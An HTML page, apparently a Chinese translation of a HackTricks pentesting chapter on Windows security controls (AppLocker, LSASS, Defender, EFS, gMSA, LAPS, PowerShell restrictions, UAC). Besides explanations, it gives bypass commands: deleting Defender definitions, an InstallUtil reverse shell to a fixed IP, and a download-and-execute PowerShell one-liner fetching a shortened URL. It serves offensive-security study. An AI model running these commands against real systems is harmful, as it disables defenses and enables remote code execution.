@@ -1,0 +1,428 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Windows Security Controls</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="windows-security-controls"><a class="header" href="#windows-security-controls">Windows Security Controls</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p>使用 <a href="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天就获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks" %}</p>
+<h2 id="applocker-策略"><a class="header" href="#applocker-策略">AppLocker 策略</a></h2>
+<p>应用程序白名单是一个经过批准的软件应用程序或可执行文件的列表，这些程序被允许在系统上存在和运行。其目标是保护环境免受有害恶意软件和不符合组织特定业务需求的未批准软件的影响。</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker">AppLocker</a> 是微软的 <strong>应用程序白名单解决方案</strong>，为系统管理员提供对 <strong>用户可以运行哪些应用程序和文件</strong> 的控制。它提供对可执行文件、脚本、Windows 安装程序文件、DLL、打包应用程序和打包应用程序安装程序的 <strong>细粒度控制</strong>。<br />
+组织通常会 <strong>阻止 cmd.exe 和 PowerShell.exe</strong> 以及对某些目录的写入访问，<strong>但这一切都可以被绕过</strong>。</p>
+<h3 id="检查"><a class="header" href="#检查">检查</a></h3>
+<p>检查哪些文件/扩展名被列入黑名单/白名单：</p>
+<pre><code class="language-powershell">Get-ApplockerPolicy -Effective -xml
+
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+$a = Get-ApplockerPolicy -effective
+$a.rulecollections
+</code></pre>
+<p>此注册表路径包含由 AppLocker 应用的配置和策略，提供了一种查看系统上强制执行的当前规则集的方法：</p>
+<ul>
+<li><code>HKLM\Software\Policies\Microsoft\Windows\SrpV2</code></li>
+</ul>
+<h3 id="绕过"><a class="header" href="#绕过">绕过</a></h3>
+<ul>
+<li>有用的 <strong>可写文件夹</strong> 用于绕过 AppLocker 策略：如果 AppLocker 允许在 <code>C:\Windows\System32</code> 或 <code>C:\Windows</code> 内执行任何内容，则可以使用 <strong>可写文件夹</strong> 来 <strong>绕过此限制</strong>。</li>
+</ul>
+<pre><code>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\Tasks
+C:\windows\tracing
+</code></pre>
+<ul>
+<li>常见的 <strong>trusted</strong> <a href="https://lolbas-project.github.io/"><strong>"LOLBAS's"</strong></a> 二进制文件也可以用于绕过 AppLocker。</li>
+<li><strong>编写不当的规则也可能被绕过</strong></li>
+<li>例如，<strong><code>&lt;FilePathCondition Path="%OSDRIVE%*\allowed*"/&gt;</code></strong>，您可以在任何地方创建一个 <strong>名为 <code>allowed</code> 的文件夹</strong>，它将被允许。</li>
+<li>组织通常还专注于 <strong>阻止 <code>%System32%\WindowsPowerShell\v1.0\powershell.exe</code> 可执行文件</strong>，但忘记了 <strong>其他</strong> <a href="https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations"><strong>PowerShell 可执行文件位置</strong></a>，例如 <code>%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code> 或 <code>PowerShell_ISE.exe</code>。</li>
+<li><strong>DLL 强制执行很少启用</strong>，因为它可能对系统造成额外负担，并且需要大量测试以确保不会出现故障。因此，使用 <strong>DLL 作为后门将有助于绕过 AppLocker</strong>。</li>
+<li>您可以使用 <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick"><strong>ReflectivePick</strong></a> 或 <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick"><strong>SharpPick</strong></a> 在任何进程中 <strong>执行 Powershell</strong> 代码并绕过 AppLocker。有关更多信息，请查看: <a href="https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode">https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode</a>。</li>
+</ul>
+<h2 id="凭据存储"><a class="header" href="#凭据存储">凭据存储</a></h2>
+<h3 id="安全账户管理器-sam"><a class="header" href="#安全账户管理器-sam">安全账户管理器 (SAM)</a></h3>
+<p>本地凭据存储在此文件中，密码经过哈希处理。</p>
+<h3 id="本地安全机构-lsa---lsass"><a class="header" href="#本地安全机构-lsa---lsass">本地安全机构 (LSA) - LSASS</a></h3>
+<p><strong>凭据</strong>（哈希）被 <strong>保存</strong> 在此子系统的 <strong>内存</strong> 中，以实现单点登录。<br />
+<strong>LSA</strong> 管理本地 <strong>安全策略</strong>（密码策略、用户权限...）、<strong>身份验证</strong>、<strong>访问令牌</strong>...<br />
+LSA 将是 <strong>检查</strong> 提供的凭据的 <strong>SAM</strong> 文件（用于本地登录）并 <strong>与</strong> 域控制器 <strong>通信</strong> 以验证域用户。</p>
+<p><strong>凭据</strong> 被 <strong>保存</strong> 在 <strong>进程 LSASS</strong> 中：Kerberos 票证、NT 和 LM 哈希、易于解密的密码。</p>
+<h3 id="lsa-秘密"><a class="header" href="#lsa-秘密">LSA 秘密</a></h3>
+<p>LSA 可能会在磁盘上保存一些凭据：</p>
+<ul>
+<li>Active Directory 的计算机账户密码（无法访问的域控制器）。</li>
+<li>Windows 服务账户的密码</li>
+<li>计划任务的密码</li>
+<li>更多（IIS 应用程序的密码...）</li>
+</ul>
+<h3 id="ntdsdit"><a class="header" href="#ntdsdit">NTDS.dit</a></h3>
+<p>这是 Active Directory 的数据库。它仅存在于域控制器中。</p>
+<h2 id="defender"><a class="header" href="#defender">Defender</a></h2>
+<p><a href="https://en.wikipedia.org/wiki/Microsoft_Defender"><strong>Microsoft Defender</strong></a> 是 Windows 10 和 Windows 11 以及 Windows Server 版本中可用的防病毒软件。它 <strong>阻止</strong> 常见的 pentesting 工具，如 <strong><code>WinPEAS</code></strong>。然而，有方法可以 <strong>绕过这些保护</strong>。</p>
+<h3 id="检查-1"><a class="header" href="#检查-1">检查</a></h3>
+<p>要检查 <strong>Defender</strong> 的 <strong>状态</strong>，您可以执行 PS cmdlet <strong><code>Get-MpComputerStatus</code></strong>（检查 <strong><code>RealTimeProtectionEnabled</code></strong> 的值以了解它是否处于活动状态）：</p>
+<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
+
+[...]
+AntispywareEnabled              : True
+AntispywareSignatureAge         : 1
+AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
+AntispywareSignatureVersion     : 1.323.392.0
+AntivirusEnabled                : True
+[...]
+NISEnabled                      : False
+NISEngineVersion                : 0.0.0.0
+[...]
+<strong>RealTimeProtectionEnabled       : True
+</strong>RealTimeScanDirection           : 0
+PSComputerName                  :
+</code></pre>
+<p>要枚举它，您还可以运行：</p>
+<pre><code class="language-bash">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+wmic /namespace:\\root\securitycenter2 path antivirusproduct
+sc query windefend
+
+#Delete all rules of Defender (useful for machines without internet access)
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+</code></pre>
+<h2 id="加密文件系统-efs"><a class="header" href="#加密文件系统-efs">加密文件系统 (EFS)</a></h2>
+<p>EFS 通过加密保护文件，利用称为 <strong>文件加密密钥 (FEK)</strong> 的 <strong>对称密钥</strong>。该密钥使用用户的 <strong>公钥</strong> 进行加密，并存储在加密文件的 $EFS <strong>替代数据流</strong> 中。当需要解密时，使用用户数字证书的相应 <strong>私钥</strong> 从 $EFS 流中解密 FEK。更多详细信息可以在 <a href="https://en.wikipedia.org/wiki/Encrypting_File_System">这里</a> 找到。</p>
+<p><strong>无需用户启动的解密场景</strong> 包括：</p>
+<ul>
+<li>当文件或文件夹被移动到非 EFS 文件系统（如 <a href="https://en.wikipedia.org/wiki/File_Allocation_Table">FAT32</a>）时，它们会自动解密。</li>
+<li>通过 SMB/CIFS 协议在网络上传输的加密文件在传输前会被解密。</li>
+</ul>
+<p>这种加密方法允许所有者对加密文件进行 <strong>透明访问</strong>。然而，仅仅更改所有者的密码并登录并不能允许解密。</p>
+<p><strong>关键要点</strong>：</p>
+<ul>
+<li>EFS 使用对称 FEK，使用用户的公钥进行加密。</li>
+<li>解密使用用户的私钥访问 FEK。</li>
+<li>在特定条件下会自动解密，例如复制到 FAT32 或网络传输。</li>
+<li>加密文件对所有者可访问，无需额外步骤。</li>
+</ul>
+<h3 id="检查-efs-信息"><a class="header" href="#检查-efs-信息">检查 EFS 信息</a></h3>
+<p>检查 <strong>用户</strong> 是否 <strong>使用</strong> 了此 <strong>服务</strong>，检查此路径是否存在：<code>C:\users\&lt;username&gt;\appdata\roaming\Microsoft\Protect</code></p>
+<p>使用 cipher /c &lt;file&gt; 检查 <strong>谁</strong> 有 <strong>访问</strong> 文件的权限<br />
+您还可以在文件夹内使用 <code>cipher /e</code> 和 <code>cipher /d</code> 来 <strong>加密</strong> 和 <strong>解密</strong> 所有文件</p>
+<h3 id="解密-efs-文件"><a class="header" href="#解密-efs-文件">解密 EFS 文件</a></h3>
+<h4 id="成为权限系统"><a class="header" href="#成为权限系统">成为权限系统</a></h4>
+<p>这种方式要求 <strong>受害者用户</strong> 在主机内 <strong>运行</strong> 一个 <strong>进程</strong>。如果是这种情况，使用 <code>meterpreter</code> 会话，您可以模拟用户进程的令牌（<code>incognito</code> 中的 <code>impersonate_token</code>）。或者您可以直接 <code>migrate</code> 到用户的进程。</p>
+<h4 id="知道用户密码"><a class="header" href="#知道用户密码">知道用户密码</a></h4>
+<p>{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}</p>
+<h2 id="组管理服务账户-gmsa"><a class="header" href="#组管理服务账户-gmsa">组管理服务账户 (gMSA)</a></h2>
+<p>微软开发了 <strong>组管理服务账户 (gMSA)</strong> 以简化 IT 基础设施中服务账户的管理。与传统的服务账户（通常启用“<strong>密码永不过期</strong>”设置）不同，gMSA 提供了更安全和可管理的解决方案：</p>
+<ul>
+<li><strong>自动密码管理</strong>：gMSA 使用复杂的 240 字符密码，自动根据域或计算机策略进行更改。此过程由微软的密钥分发服务 (KDC) 处理，消除了手动更新密码的需要。</li>
+<li><strong>增强安全性</strong>：这些账户免受锁定，并且不能用于交互式登录，从而增强了安全性。</li>
+<li><strong>多主机支持</strong>：gMSA 可以在多个主机之间共享，非常适合在多个服务器上运行的服务。</li>
+<li><strong>计划任务能力</strong>：与管理服务账户不同，gMSA 支持运行计划任务。</li>
+<li><strong>简化 SPN 管理</strong>：当计算机的 sAMaccount 详细信息或 DNS 名称发生更改时，系统会自动更新服务主体名称 (SPN)，简化 SPN 管理。</li>
+</ul>
+<p>gMSA 的密码存储在 LDAP 属性 <em><strong>msDS-ManagedPassword</strong></em> 中，并由域控制器 (DC) 每 30 天自动重置一次。此密码是一个称为 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e">MSDS-MANAGEDPASSWORD_BLOB</a> 的加密数据块，仅可由授权管理员和安装 gMSA 的服务器检索，从而确保安全环境。要访问此信息，需要安全连接，例如 LDAPS，或者连接必须经过“密封和安全”身份验证。</p>
+<p><img src="../../.gitbook/assets/asd1.png" alt="https://cube0x0.github.io/Relaying-for-gMSA/" /></p>
+<p>您可以使用 <a href="https://github.com/rvazarkar/GMSAPasswordReader"><strong>GMSAPasswordReader</strong></a>**：</p>
+<pre><code>/GMSAPasswordReader --AccountName jkohler
+</code></pre>
+<p><a href="https://cube0x0.github.io/Relaying-for-gMSA/"><strong>在此帖子中找到更多信息</strong></a></p>
+<p>此外，请查看此<a href="https://cube0x0.github.io/Relaying-for-gMSA/">网页</a>关于如何执行<strong>NTLM中继攻击</strong>以<strong>读取</strong> <strong>gMSA</strong>的<strong>密码</strong>。</p>
+<h2 id="laps"><a class="header" href="#laps">LAPS</a></h2>
+<p><strong>本地管理员密码解决方案（LAPS）</strong>，可从<a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">Microsoft</a>下载，允许管理本地管理员密码。这些密码是<strong>随机生成</strong>、唯一且<strong>定期更改</strong>的，集中存储在Active Directory中。对这些密码的访问通过ACL限制为授权用户。授予足够的权限后，可以读取本地管理员密码。</p>
+<p>{% content-ref url="../active-directory-methodology/laps.md" %}
+<a href="../active-directory-methodology/laps.html">laps.md</a>
+{% endcontent-ref %}</p>
+<h2 id="ps受限语言模式"><a class="header" href="#ps受限语言模式">PS受限语言模式</a></h2>
+<p>PowerShell <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/"><strong>受限语言模式</strong></a> <strong>锁定了许多有效使用PowerShell所需的功能</strong>，例如阻止COM对象，仅允许批准的.NET类型、基于XAML的工作流、PowerShell类等。</p>
+<h3 id="检查-2"><a class="header" href="#检查-2"><strong>检查</strong></a></h3>
+<pre><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode
+#Values could be: FullLanguage or ConstrainedLanguage
+</code></pre>
+<h3 id="绕过-1"><a class="header" href="#绕过-1">绕过</a></h3>
+<pre><code class="language-powershell">#Easy bypass
+Powershell -version 2
+</code></pre>
+<p>在当前的Windows中，绕过方法将不起作用，但您可以使用<a href="https://github.com/padovah4ck/PSByPassCLM"> <strong>PSByPassCLM</strong></a>。<br />
+<strong>要编译它，您可能需要</strong> <strong><em>添加引用</em></strong> -&gt; <em>浏览</em> -&gt; <em>浏览</em> -&gt; 添加 <code>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll</code> 并<strong>将项目更改为 .Net4.5</strong>。</p>
+<h4 id="直接绕过"><a class="header" href="#直接绕过">直接绕过：</a></h4>
+<pre><code class="language-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
+</code></pre>
+<h4 id="反向-shell"><a class="header" href="#反向-shell">反向 shell:</a></h4>
+<pre><code class="language-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
+</code></pre>
+<p>您可以使用 <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick"><strong>ReflectivePick</strong></a> 或 <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick"><strong>SharpPick</strong></a> 来 <strong>执行 Powershell</strong> 代码在任何进程中并绕过受限模式。有关更多信息，请查看: <a href="https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode">https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode</a>。</p>
+<h2 id="ps-执行策略"><a class="header" href="#ps-执行策略">PS 执行策略</a></h2>
+<p>默认情况下，它设置为 <strong>restricted.</strong> 绕过此策略的主要方法：</p>
+<pre><code class="language-powershell">1º Just copy and paste inside the interactive PS console
+2º Read en Exec
+Get-Content .runme.ps1 | PowerShell.exe -noprofile -
+3º Read and Exec
+Get-Content .runme.ps1 | Invoke-Expression
+4º Use other execution policy
+PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
+5º Change users execution policy
+Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+6º Change execution policy for this session
+Set-ExecutionPolicy Bypass -Scope Process
+7º Download and execute:
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
+8º Use command switch
+Powershell -command "Write-Host 'My voice is my passport, verify me.'"
+9º Use EncodeCommand
+$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
+</code></pre>
+<p>更多信息可以在 <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">这里</a> 找到。</p>
+<h2 id="安全支持提供者接口-sspi"><a class="header" href="#安全支持提供者接口-sspi">安全支持提供者接口 (SSPI)</a></h2>
+<p>是用于验证用户的 API。</p>
+<p>SSPI 将负责为想要通信的两台机器找到合适的协议。首选的方法是 Kerberos。然后，SSPI 将协商使用哪个身份验证协议，这些身份验证协议称为安全支持提供者 (SSP)，以 DLL 的形式位于每台 Windows 机器内部，并且两台机器必须支持相同的协议才能进行通信。</p>
+<h3 id="主要-ssps"><a class="header" href="#主要-ssps">主要 SSPs</a></h3>
+<ul>
+<li><strong>Kerberos</strong>: 首选</li>
+<li>%windir%\Windows\System32\kerberos.dll</li>
+<li><strong>NTLMv1</strong> 和 <strong>NTLMv2</strong>: 兼容性原因</li>
+<li>%windir%\Windows\System32\msv1_0.dll</li>
+<li><strong>Digest</strong>: Web 服务器和 LDAP，密码以 MD5 哈希形式存在</li>
+<li>%windir%\Windows\System32\Wdigest.dll</li>
+<li><strong>Schannel</strong>: SSL 和 TLS</li>
+<li>%windir%\Windows\System32\Schannel.dll</li>
+<li><strong>Negotiate</strong>: 用于协商使用的协议（Kerberos 或 NTLM，默认是 Kerberos）</li>
+<li>%windir%\Windows\System32\lsasrv.dll</li>
+</ul>
+<h4 id="协商可以提供多种方法或仅提供一种"><a class="header" href="#协商可以提供多种方法或仅提供一种">协商可以提供多种方法或仅提供一种。</a></h4>
+<h2 id="uac---用户帐户控制"><a class="header" href="#uac---用户帐户控制">UAC - 用户帐户控制</a></h2>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">用户帐户控制 (UAC)</a> 是一个启用 <strong>提升活动的同意提示</strong> 的功能。</p>
+<p>{% content-ref url="uac-user-account-control.md" %}
+<a href="uac-user-account-control.html">uac-user-account-control.md</a>
+{% endcontent-ref %}</p>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+立即获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks" %}</p>
+<hr />
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/unconstrained-delegation.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/unconstrained-delegation.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
